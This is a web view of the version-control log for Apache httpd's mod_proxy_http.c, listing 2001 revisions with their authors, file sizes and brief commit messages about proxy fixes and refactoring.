([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89551&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89551&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=89551))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=89551)

Modified
*Sat Jul 14 20:18:45 2001 UTC*
(23 years, 6 months ago)
by *ianh*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=89551)

File length: 29330 byte(s)

Diff to [previous 89550](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89550&r2=89551)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89550&r2=89551&diff_format=h))
```
Last Log entry was bogus.
Changed to 'setting' the X-Forwarded-Server X-Forwarded-Host X-Forwarded-For
headers instead of merging them
PR:

```

---

Revision [**89550**](/viewvc?view=revision&revision=89550) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89550&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89550&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=89550))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=89550)

Modified
*Sat Jul 14 20:17:07 2001 UTC*
(23 years, 6 months ago)
by *ianh*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=89550)

File length: 29329 byte(s)

Diff to [previous 89489](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89489&r2=89550)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89489&r2=89550&diff_format=h))
```
PR:

```

---

Revision [**89489**](/viewvc?view=revision&revision=89489) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89489&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89489&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=89489))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=89489)

Modified
*Mon Jul 2 03:37:37 2001 UTC*
(23 years, 7 months ago)
by *orlikowski*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=89489)

File length: 29335 byte(s)

Diff to [previous 89486](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89486&r2=89489)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89486&r2=89489&diff_format=h))
```
Remove a couple of extraneous calls to apr_brigade_cleanup()

```

---

Revision [**89486**](/viewvc?view=revision&revision=89486) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89486&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89486&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=89486))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=89486)

Modified
*Sat Jun 30 04:50:31 2001 UTC*
(23 years, 7 months ago)
by *chuck*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=89486)

File length: 29376 byte(s)

Diff to [previous 89280](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89280&r2=89486)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89280&r2=89486&diff_format=h))
```
Fix abort code path for HTTP proxy. Similar to Victor's patch for FTP
proxy. No, Julia, it really *is* a double negative.

```

---

Revision [**89280**](/viewvc?view=revision&revision=89280) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89280&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89280&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=89280))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=89280)

Modified
*Wed Jun 6 21:51:58 2001 UTC*
(23 years, 7 months ago)
by *chuck*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=89280)

File length: 29145 byte(s)

Diff to [previous 89213](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89213&r2=89280)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89213&r2=89280&diff_format=h))
```
Use apr-util's date functions now

```

---

Revision [**89213**](/viewvc?view=revision&revision=89213) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89213&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89213&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=89213))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=89213)

Modified
*Wed May 23 06:43:46 2001 UTC*
(23 years, 8 months ago)
by *orlikowski*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=89213)

File length: 29139 byte(s)

Diff to [previous 89210](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89210&r2=89213)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89210&r2=89213&diff_format=h))
```
YAPJBUJ.
(Yet Another Proxy Janitor Botched-Up Job).
Need to be looking for APR_SUCCESS here, not HTTP_OK.
Obtained from: Justin Erenkrantz

```

---

Revision [**89210**](/viewvc?view=revision&revision=89210) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89210&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89210&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=89210))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=89210)

Modified
*Wed May 23 03:39:44 2001 UTC*
(23 years, 8 months ago)
by *orlikowski*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=89210)

File length: 29135 byte(s)

Diff to [previous 89204](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89204&r2=89210)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89204&r2=89210&diff_format=h))
```
Bletch. The Proxy Janitor botches the job again.
Thanks to Ian Holsman for the catch.

```

---

Revision [**89204**](/viewvc?view=revision&revision=89204) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89204&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89204&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=89204))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=89204)

Modified
*Tue May 22 19:37:13 2001 UTC*
(23 years, 8 months ago)
by *orlikowski*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=89204)

File length: 29134 byte(s)

Diff to [previous 89085](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89085&r2=89204)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89085&r2=89204&diff_format=h))
```
Fixes to proxy, after util-uri move, plus fixes to the .mak file.

```

---

Revision [**89085**](/viewvc?view=revision&revision=89085) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89085&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89085&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=89085))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=89085)

Modified
*Fri May 11 17:32:41 2001 UTC*
(23 years, 8 months ago)
by *ianh*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=89085)

File length: 29120 byte(s)

Diff to [previous 89052](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89052&r2=89085)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89052&r2=89085&diff_format=h))
```
Allows Mod_proxy to be dynamically loaded on win32 systems
PR:
Obtained from:
Submitted by:	ianh
Reviewed by:	Chuck Murcko, Graham

```

---

Revision [**89052**](/viewvc?view=revision&revision=89052) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89052&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89052&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=89052))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=89052)

Modified
*Mon May 7 20:02:39 2001 UTC*
(23 years, 8 months ago)
by *orlikowski*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=89052)

File length: 29184 byte(s)

Diff to [previous 89044](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89044&r2=89052)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89044&r2=89052&diff_format=h))
```
Shut the compiler up.

```

---

Revision [**89044**](/viewvc?view=revision&revision=89044) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89044&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89044&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=89044))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=89044)

Modified
*Mon May 7 02:47:51 2001 UTC*
(23 years, 8 months ago)
by *chuck*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=89044)

File length: 29177 byte(s)

Diff to [previous 89037](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89037&r2=89044)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=89037&r2=89044&diff_format=h))
```
Crikey.

```

---

Revision [**89037**](/viewvc?view=revision&revision=89037) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89037&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=89037&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=89037))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=89037)

Modified
*Sun May 6 10:59:22 2001 UTC*
(23 years, 8 months ago)
by *chuck*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=89037)

File length: 29176 byte(s)

Diff to [previous 88928](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88928&r2=89037)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88928&r2=89037&diff_format=h))
```
Track Greg's change to byte count for input filters

```

---

Revision [**88928**](/viewvc?view=revision&revision=88928) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88928&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88928&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88928))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88928)

Modified
*Tue Apr 24 08:38:43 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88928)

File length: 29177 byte(s)

Diff to [previous 88927](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88927&r2=88928)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88927&r2=88928&diff_format=h))
```
Stopped the HTTP proxy from trying to read entity bodies when there
wasn't one (response was 1xx, 204, 205 or 304).
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88927**](/viewvc?view=revision&revision=88927) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88927&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88927&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88927))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88927)

Modified
*Tue Apr 24 04:38:53 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88927)

File length: 28885 byte(s)

Diff to [previous 88923](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88923&r2=88927)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88923&r2=88927&diff_format=h))
```
Made the variable naming the same as everywhere else in Apache for the
ap_get_brigade() fix.
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88923**](/viewvc?view=revision&revision=88923) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88923&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88923&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88923))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88923)

Modified
*Mon Apr 23 21:49:15 2001 UTC*
(23 years, 9 months ago)
by *orlikowski*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88923)

File length: 28870 byte(s)

Diff to [previous 88922](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88922&r2=88923)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88922&r2=88923&diff_format=h))
```
Sometimes, boys and girls, pointers and integers *aren't interchangeable.

```

---

Revision [**88922**](/viewvc?view=revision&revision=88922) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88922&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88922&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88922))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88922)

Modified
*Mon Apr 23 21:03:39 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88922)

File length: 28869 byte(s)

Diff to [previous 88898](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88898&r2=88922)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88898&r2=88922&diff_format=h))
```
Apply changes to ap_get_brigade() to the proxy code.
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88898**](/viewvc?view=revision&revision=88898) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88898&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88898&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88898))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88898)

Modified
*Thu Apr 19 21:18:41 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88898)

File length: 28839 byte(s)

Diff to [previous 88866](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88866&r2=88898)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88866&r2=88898&diff_format=h))
```
Made sure dates were canonicalised correctly when passed to the client
browser through the HTTP proxy.
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88866**](/viewvc?view=revision&revision=88866) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88866&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88866&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88866))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88866)

Modified
*Sun Apr 15 17:15:29 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88866)

File length: 28274 byte(s)

Diff to [previous 88854](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88854&r2=88866)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88854&r2=88866&diff_format=h))
```
Split each individual proxy protocol into separate modules.
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88854**](/viewvc?view=revision&revision=88854) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88854&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88854&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88854))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88854)

Modified
*Sat Apr 14 07:03:00 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88854)

File length: 27643 byte(s)

Diff to [previous 88853](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88853&r2=88854)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88853&r2=88854&diff_format=h))
```
Make hooks work for the *_canon() functions. Work continues.
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88853**](/viewvc?view=revision&revision=88853) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88853&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88853&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88853))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88853)

Modified
*Fri Apr 13 23:56:04 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88853)

File length: 27313 byte(s)

Diff to [previous 88846](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88846&r2=88853)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88846&r2=88853&diff_format=h))
```
Initial support for proxy protocol handler sub-modules. Work continues.
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88846**](/viewvc?view=revision&revision=88846) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88846&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88846&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88846))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88846)

Modified
*Fri Apr 13 15:30:32 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88846)

File length: 26633 byte(s)

Diff to [previous 88817](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88817&r2=88846)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88817&r2=88846&diff_format=h))
```
Fixed all the APR error codes to make sure they end up in the logfiles
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**88817**](/viewvc?view=revision&revision=88817) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88817&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88817&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88817))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88817)

Modified
*Thu Apr 12 01:57:48 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88817)

File length: 26621 byte(s)

Diff to [previous 88814](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88814&r2=88817)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88814&r2=88817&diff_format=h))
```
FTP directory filter works now.
Many FIXME notes added.
Much overhauling of proxy_ftp.c
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88814**](/viewvc?view=revision&revision=88814) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88814&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88814&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88814))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88814)

Modified
*Wed Apr 11 23:07:21 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88814)

File length: 26543 byte(s)

Diff to [previous 88800](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88800&r2=88814)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88800&r2=88814&diff_format=h))
```
Fixed some thread-safety issues with the HTTP proxy in mod_proxy.
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88800**](/viewvc?view=revision&revision=88800) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88800&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88800&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88800))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88800)

Modified
*Tue Apr 10 21:31:10 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88800)

File length: 26183 byte(s)

Diff to [previous 88799](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88799&r2=88800)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88799&r2=88800&diff_format=h))
```
Small fixes.
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88799**](/viewvc?view=revision&revision=88799) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88799&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88799&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88799))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88799)

Modified
*Tue Apr 10 20:55:05 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88799)

File length: 26385 byte(s)

Diff to [previous 88797](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88797&r2=88799)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88797&r2=88799&diff_format=h))
```
A client POST request would be read entirely into RAM before sending it
on the client - a potential DoS. Fixed.
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88797**](/viewvc?view=revision&revision=88797) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88797&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88797&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88797))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88797)

Modified
*Tue Apr 10 20:44:16 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88797)

File length: 26467 byte(s)

Diff to [previous 88793](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88793&r2=88797)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88793&r2=88797&diff_format=h))
```
Make sure the filter stack in a reused downstream connection is reset
so we don't get lots of DECHUNK filters when we don't want them.
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88793**](/viewvc?view=revision&revision=88793) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88793&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88793&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88793))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88793)

Modified
*Tue Apr 10 19:52:40 2001 UTC*
(23 years, 9 months ago)
by *minfrin*

Original Path: [*httpd/httpd/trunk/modules/proxy/proxy\_http.c*](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_http.c?view=log&pathrev=88793)

File length: 26315 byte(s)

Diff to [previous 88779](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88779&r2=88793)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=88779&r2=88793&diff_format=h))
```
We now keep the entire conn_rec across downstream keepalives, not
just the socket.
Made the "keepalive mismatch" message more accurate.
PR:
Obtained from:
Reviewed by:

```

---

Revision [**88779**](/viewvc?view=revision&revision=88779) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88779&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=88779&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=88779))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=88779)

Modified
